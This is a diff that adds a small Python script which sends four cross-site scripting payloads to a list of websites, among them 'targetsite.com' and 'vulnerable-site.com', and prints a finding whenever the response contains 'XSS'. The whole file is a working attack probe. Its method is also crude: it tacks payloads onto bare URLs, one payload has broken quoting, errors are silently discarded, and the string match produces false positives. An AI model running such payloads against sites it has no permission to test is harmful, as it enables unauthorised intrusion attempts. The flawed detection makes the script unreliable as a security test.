@@ -1,0 +1,26 @@
+import requests
+
+# List of URLs to test
+urls_to_test = ["https://example.com", "https://targetsite.com", "https://vulnerable-site.com"]
+
+# List of XSS payloads, including difficult ones
+xss_payloads = [
+    "<script>alert('XSS1');</script>",
+    "<img src='x' onerror='alert('XSS2');'>",
+    "'><svg onload='alert('XSS3');'>",
+    "><img/src=x onerror=alert('XSS4')>"
+]
+
+# Function to test a URL for XSS vulnerabilities with payloads
+def test_xss(url, payload):
+    try:
+        response = requests.get(url + payload)
+        if "XSS" in response.text:
+            print(f"XSS Vulnerability found at URL: {url} with payload: {payload}")
+    except Exception as e:
+        pass
+
+# Loop through each URL and test with payloads
+for url in urls_to_test:
+    for xss_payload in xss_payloads:
+        test_xss(url, xss_payload)
